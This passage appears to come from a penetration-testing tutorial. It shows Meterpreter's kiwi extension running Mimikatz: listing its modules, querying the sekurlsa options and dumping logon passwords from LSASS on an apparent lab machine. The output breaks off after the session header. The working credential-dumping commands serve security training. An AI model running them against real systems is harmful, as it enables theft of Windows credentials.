```
crypto - Crypto Module
sekurls a - SekurLSA module
[Some commands to enumerate credentials...]
...

dpapi - DPAPI Module (by API or RAW access)
[Data Protection application programming interface]
sysenv - System Environment Value module
sid - Security Identifiers module
iis - IIS XML Config module
rpc - RPC control of mimikatz
```

8. To query the available options for a specific module, we can use the following syntax:

```
meterpreter > kiwi_cmd sekurls a::
ERROR mimikatz_doLocal ; "(null)" command of "sekurls a" module not found !

Module : sekurls a
Full name : SekurLSA module
Description : Some commands to enumerate credentials...

msw - Lists LM & NTLM credentials
wdigest - Lists WDigest credentials
kerberos - Lists Kerberos credentials
tspkg - Lists TsPkg credentials
livessp - Lists LiveSSP credentials
ssp - Lists SSP credentials
logonPasswords - Lists all available providers credentials
process - Switch (or reinit) to LSASS process context
minidump - Switch (or reinit) to LSASS minidump context
...
```

9. Now that we know which module we wish to use and the available options, we can use the kiwi_cmd command to list all the available credentials of the provider with the sekurls a module:

```
meterpreter > kiwi_cmd sekurls a::logonpasswords

Authentication Id : 0 ; 742172 (00000000:000b531c)
Session          : Interactive from 1
User Name        : vagrant
Domain           : VAGRANT-2008R2
```